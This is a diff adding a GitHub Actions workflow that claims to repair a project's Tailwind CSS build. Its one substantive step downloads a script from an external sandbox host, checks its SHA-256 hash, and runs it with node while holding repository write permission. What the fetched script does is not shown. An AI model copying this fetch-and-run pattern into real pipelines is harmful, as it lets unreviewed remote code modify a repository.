@@ -1,0 +1,20 @@
+name: Fix Wingking Tailwind CSS
+on:
+  push:
+    branches: [dev/unknown2-1]
+    paths: [.github/workflows/css-repair.yml]
+permissions:
+  contents: write
+jobs:
+  fix:
+    runs-on: ubuntu-latest
+    timeout-minutes: 20
+    steps:
+      - uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683
+        with: { ref: dev/unknown2-1 }
+      - uses: actions/setup-node@49933ea5288caeca8642d1e84afbd3f7d6820020
+        with: { node-version: '22' }
+      - run: |
+          curl -fsSL --retry 2 -o /tmp/fix.mjs 'https://c9ab7109-d689-480d-86f7-318f0529f108.sandbox.floot.app/_cdn/static/wingking-css-build-repair-20261027.mjs'
+          echo '258500cb3993df599b570cd9564b2aa2ca549b4206480727c8453a03b4248365  /tmp/fix.mjs' | sha256sum -c -
+          node /tmp/fix.mjs
